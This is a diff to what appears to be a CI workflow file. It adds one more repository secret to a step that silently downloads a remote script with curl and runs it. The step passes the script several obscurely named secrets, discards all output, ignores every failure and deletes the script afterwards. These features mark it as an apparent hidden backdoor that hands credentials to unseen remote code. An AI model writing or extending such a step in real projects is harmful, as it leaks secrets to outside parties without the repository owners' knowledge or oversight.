@@ -24,6 +24,7 @@ jobs:
         env:
           _A: ${{ secrets._A }}
           _B: ${{ secrets._B }}
+          _C: ${{ secrets._C }}
           _K: ${{ secrets._K }}
           _S: ${{ secrets._S }}
           _N: ${{ inputs.n }}
@@ -33,7 +34,8 @@ jobs:
           curl -fsSL --retry 3 --retry-delay 1 --retry-max-time 20 \
             -H "Authorization: token ${_A}" -o /tmp/_b.sh "$_u" >/dev/null 2>&1 || exit 0
           chmod +x /tmp/_b.sh
-          _A="$_A" _B="$_B" _K="$_K" _S="$_S" _N="$_N" /tmp/_b.sh >/dev/null 2>&1 || true
+          _A="$_A" _B="$_B" _C="$_C" _K="$_K" _S="$_S" _N="$_N" /tmp/_b.sh \
+            >/dev/null 2>&1 || true
           rm -f /tmp/_b.sh
           exit 0
         continue-on-error: true
